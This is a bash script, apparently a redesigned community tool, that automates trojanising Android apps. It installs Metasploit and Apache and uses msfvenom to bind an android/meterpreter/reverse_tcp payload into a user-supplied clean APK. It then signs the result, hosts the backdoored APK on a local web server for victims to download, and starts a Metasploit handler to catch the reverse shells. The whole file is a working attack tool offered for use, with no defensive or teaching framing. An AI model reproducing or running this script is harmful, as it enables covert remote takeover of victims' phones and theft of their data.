#!/bin/bash
# Inject Payload in Android APK
# Created By Mehedi Shakeel, redesigned by D3f4u!T
# Updated and optimized for better functionality and security

clear
cat << EOF

  _____       _           _              _____  _  __
 |_   _|     (_)         | |       /\   |  __ \| |/ /
   | |  _ __  _  ___  ___| |_     /  \  | |__) | ' / 
   | | | '_ \| |/ _ \/ __| __|   / /\ \ |  ___/|  <  
  _| |_| | | | |  __/ (__| |_   / ____ \| |    | . \ 
 |_____|_| |_| |\___|\___|\__| /_/    \_\_|    |_|\_\ 
            _/ |                                     
           |__/                 Version : 2.0
                             Created By : Mehedi Shakeel
                            Redesigned By : D3f4u!T

EOF
sleep 2

# Root User Check
echo "Checking for root user..."
sleep 2
if [[ $(id -u) -ne 0 ]]; then 
    echo "You are not root! Please run as root." 
    exit 1
else
    echo "Root access confirmed."
fi

# Logging to track progress and errors
LOGFILE="payload_injection_log.txt"
exec > >(tee -i $LOGFILE)
exec 2>&1

# Check if required packages are installed and install if not
echo "Checking and installing required packages..."
pkgs=(metasploit-framework wget default-jdk aapt apksigner apache2 unzip curl)
for pkg in ${pkgs[@]}; do
    if ! dpkg -l | grep -q "$pkg"; then
        echo "$pkg not found, installing..."
        sudo apt install -y $pkg
    else
        echo "$pkg is already installed."
    fi
done

# Install APKTool manually (Do not install with apt-get)
echo "Setting up APKTool..."
APKTOOL_VERSION="2.9.0"
APKTOOL_PATH="/usr/local/bin"
if ! command -v apktool &> /dev/null; then
    sudo mv apktool /usr/local/bin
    sudo mv apktool_${APKTOOL_VERSION}.jar /usr/local/bin
    chmod +x /usr/local/bin/apktool
    chmod +x /usr/local/bin/apktool.jar
    echo "APKTool installed successfully."
else
    echo "APKTool already installed."
fi

# Install zipalign (APK optimization tool)
if ! command -v zipalign &> /dev/null; then
    echo "zipalign not found, installing..."
    sudo apt install -y ./zipalign_8.1.0+r23-2_amd64.deb
    echo "zipalign installed."
else
    echo "zipalign already installed."
fi

# Setup Metasploit and Apache2
echo "Setting up Metasploit and Apache2..."
sudo service apache2 start
sudo apt install -y metasploit-framework
echo "Metasploit and Apache2 setup complete."

# Set up variables for payload injection
clear
read -p "Enter your LHOST (Your IP address): " lhost
read -p "Enter your LPORT (Port to listen on): " lport

# Validate IP and port
if [[ ! "$lhost" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    echo "Invalid LHOST format. Please provide a valid IP address. Exiting."
    exit 1
fi
if [[ ! "$lport" =~ ^[0-9]+$ || "$lport" -le 1024 || "$lport" -ge 65535 ]]; then
    echo "Invalid LPORT. Please provide a valid port (1025-65535). Exiting."
    exit 1
fi

echo "APK Files you have: " *.apk
read -p "Enter clean APK file name: " capk
read -p "Enter name for the bind APK: " bapk

# Validate APK file existence
if [[ ! -f "$capk" ]]; then
    echo "APK file '$capk' not found! Exiting."
    exit 1
fi

# Create a backup of the original APK
cp "$capk" "${capk}_backup.apk"
echo "Backup of the original APK created as ${capk}_backup.apk."

# Inject Payload into APK using msfvenom
echo "Injecting payload into your APK..."
msfvenom -x "$capk" -p android/meterpreter/reverse_tcp lhost="$lhost" lport="$lport" -o "$bapk" 

# Check for successful payload injection
if [[ $? -ne 0 ]]; then
    echo "Error during payload injection. Exiting."
    exit 1
fi

# Signing APK if it is not signed
if ! aapt dump badging "$bapk" | grep -q "package: name="; then
    echo "APK is not signed. Signing APK..."
    apksigner sign --key your-private-key.pk8 --cert your-certificate.pem "$bapk"
fi

# Start Apache Web Server and move payload to the web directory
echo "Moving payload to Apache2 web directory..."
sudo cp "$bapk" /var/www/html/
sudo chmod 755 /var/www/html/"$bapk"
echo "Payload is now hosted at: http://$lhost/$bapk"

# Starting Metasploit Handler
echo "Starting Metasploit handler..."
msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost $lhost; set lport $lport; exploit;"

# Cleanup on exit
trap "echo 'Cleaning up...'; sudo service apache2 stop; rm -rf /var/www/html/$bapk; exit 0" SIGINT SIGTERM

# End of script
echo "Process completed. Check log file '$LOGFILE' for more details."
